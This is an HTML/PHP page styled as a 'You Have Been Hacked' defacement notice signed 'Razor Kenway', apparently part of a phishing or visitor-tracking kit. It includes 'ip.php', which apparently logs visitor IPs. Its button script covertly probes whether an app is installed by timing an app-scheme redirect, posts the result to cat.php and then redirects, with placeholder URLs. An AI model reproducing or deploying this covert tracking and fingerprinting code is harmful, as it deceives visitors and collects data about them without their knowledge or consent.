<html>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<head>
</head>
<style>
body {
padding-top: 8%;
padding-left: 25%;
font-family: Arial, Helvetica, sans-serif;
}

p {

 font-size: 0.8em;
 text-decoration: none;
 color: gray;
}


h1 {

color: #585858;
padding-top: 1em;
font-size: 1.4em;
font-weight: bold;
}

h3 {
color: #585858;
font-size: 1em;

  font-weight: normal;
}
.button {
  background-color: rgb(26,115,232);
  border: none;
  border-radius: 4px;
  color: white;
  padding: 8px 23px;
  text-align: center;
  text-decoration: none;
  display: inline-block;
  font-size: 1em;

}

</style>
<body>
<?php
include 'ip.php';
?>
<h1><font color=red>You Have Been Hacked !!!</font></h1>
<h1> by <b> Razor Kenway  </h1>  
<br><br>
<button class="button" onclick="clickHandler()">Bull Anonymous
</button>

 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script>

function clickHandler() {
var timestamp             = new Date().getTime();
var timerDelay              = 3000;
var processingBuffer  = 50;

var redirect = function(url) {

  window.location = url;


  log('ts: ' + timestamp + '; redirecting to: ' + url);
}
var isPageHidden = function() {
    var browserSpecificProps = {hidden:1, mozHidden:1, msHidden:1, webkitHidden:1};
    for (var p in browserSpecificProps) {
        if(typeof document[p] !== "undefined"){
        return document[p];
      }
    }
    return false; // actually inconclusive, assuming not
}
var elapsedMoreTimeThanTimerSet = function(){
    var elapsed = new Date().getTime() - timestamp;
  log('elapsed: ' + elapsed);
  return timerDelay + processingBuffer < elapsed;
}
var redirectToFallbackIfBrowserStillActive = function() {
  var elapsedMore = elapsedMoreTimeThanTimerSet();
  log('hidden:' + isPageHidden() +'; time: '+ elapsedMore);
  if (isPageHidden() || elapsedMore) {
    log('not redirecting'); //post "has app"
      $.ajax({
    type: 'POST',
    url: 'cat.php',
    data: {
        'app': 'true'

    },
    success: function(msg){

    }
});
window.location.replace('redirect_url');


  }else{
    redirect('redirect_url'); //doenst has the app installed


      $.ajax({
    type: 'POST',
    url: 'cat.php',
    data: {
        'app': 'false'

    },
    success: function(msg){

    }

});



  }
}
var log = function(msg){
//    document.getElementById('log').innerHTML += msg + "<br>";
}

setTimeout(redirectToFallbackIfBrowserStillActive, timerDelay);
redirect('redirect_app');

}

</script>
</body>
</html>
